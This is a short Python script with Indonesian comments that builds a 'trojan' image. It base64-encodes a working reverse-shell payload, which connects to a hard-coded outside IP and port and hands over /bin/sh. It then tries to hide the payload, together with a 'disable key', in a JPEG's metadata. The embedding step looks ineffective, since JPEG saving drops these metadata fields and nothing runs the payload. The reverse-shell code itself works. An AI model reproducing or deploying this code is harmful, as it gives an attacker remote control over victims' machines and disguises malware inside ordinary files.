from PIL import Image
import io
import base64

# Kode jahat yang mau disisipin (reverse shell contohnya)
payload = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("182.8.97.198",4756)) # Ganti IP_LO sama PORT_LO
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""

# Enkripsi payload biar gak gampang dibaca
payload_encoded = base64.b64encode(payload.encode()).decode()

# Kunci buat nonaktifin Trojan
key = "dafaputra"
key_encoded = base64.b64encode(key.encode()).decode()

# Gambar yang mau dipake
image_path = "gambar_asli.jpg" # Ganti sama nama file gambar lo
img = Image.open(image_path)

# Sisipin payload dan kunci ke dalam metadata gambar
img.info['payload'] = payload_encoded
img.info['key'] = key_encoded

# Simpan gambar yang udah disisipin
new_image_path = "gambar_trojan.jpg"
img.save(new_image_path)

print(f"Trojan berhasil disisipkan ke dalam {new_image_path}")
